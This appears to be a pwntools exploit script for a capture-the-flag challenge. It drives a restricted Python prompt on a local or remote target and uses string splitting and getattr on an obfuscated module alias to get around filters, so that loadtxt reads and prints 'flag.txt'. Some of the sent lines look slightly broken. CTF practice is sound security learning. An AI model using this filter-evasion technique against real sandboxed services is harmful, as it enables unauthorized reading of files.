import sys
import logging
from pwn import *
logging.basicConfig(level=logging.INFO, format="%(message)s")
#logging.disable(logging.CRITICAL)

if len(sys.argv) == 2:
    program_name = sys.argv[1]
    target = process(program_name)
    logging.info("***local exploit ***")

else:
    HOST = sys.argv[1]
    PORT = int(sys.argv[2])
    logging.info("***remote exploit ***")
    logging.info("[*]target host : " + HOST)
    logging.info("[*]target port : " + str(PORT))
    target = remote(HOST, PORT)

###main###
def main():
    _ = target.recvuntil(">>> ")
    command = b"strs = [\"flag\", \".txt\", \"dt\", \"ype\"]"
    print(b"[*] send : " + command)
    target.sendline(command)

    print(target.recvuntil(">>> "))
    command = b"d_ty_pe = getattr(RMbPOQHCzt, strs[2] + strs[3])"
    print(b"[*] send : " + command)
    target.sendline(command)
    print(target.recvuntil(">>> "))

    command = b"print(d_ty_pe)"
    print(b"[*] send : " + command)
    target.sendline(command)
    print(target.recvuntil(">>> "))
    
    command = b"d_ty_pe = 'unicode')"
    # command = b"ans = RMbPOQHCzt.loadtxt(strs[0] + strs[1])"
    print(b"[*] send : " + command)
    target.sendline(command)
    print(target.recvuntil(">>> "))

    command = b"ans = RMbPOQHCzt.loadtxt(strs[0] + strs[1], d_ty_pe)"
    # command = b"ans = RMbPOQHCzt.loadtxt(strs[0] + strs[1])"
    print(b"[*] send : " + command)
    target.sendline(command)
    print(target.recvuntil(">>> "))

    command = b"print(ans)"
    print(b"[*] send : " + command)
    target.sendline(command)
    print(target.recvuntil(">>> "))


if __name__ == "__main__":
    main()